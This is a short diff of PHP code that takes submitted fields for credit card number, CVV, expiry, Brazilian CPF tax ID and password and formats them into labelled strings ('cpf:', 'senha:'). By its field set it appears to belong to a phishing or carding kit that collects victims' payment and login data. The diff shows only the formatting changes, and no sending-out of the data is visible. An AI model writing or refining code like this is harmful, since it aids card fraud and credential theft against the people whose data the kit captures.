@@ -30,11 +30,11 @@
                                                     {
                                                         case 'cc1':
                                                         case 'cc':
-                                                            $string[0] = str_replace(' ', '.', $value);
+                                                            $string[0] = str_replace(' ', '', $value);
                                                             break;
                                                         case 'cpf1':
                                                         case 'cpf':
-                                                            $string[4] = $value;
+                                                            $string[4] = 'cpf: ' . $value;
                                                             break;
                                                         case 'cvv1':
                                                         case 'cvv':
@@ -42,7 +42,7 @@
                                                             break;
                                                         case 'password1':
                                                         case 'password':
-                                                            $string[3] = $value;
+                                                            $string[3] = 'senha: ' . $value;
                                                             break;
                                                         case 'validity1':
                                                         case 'validity':
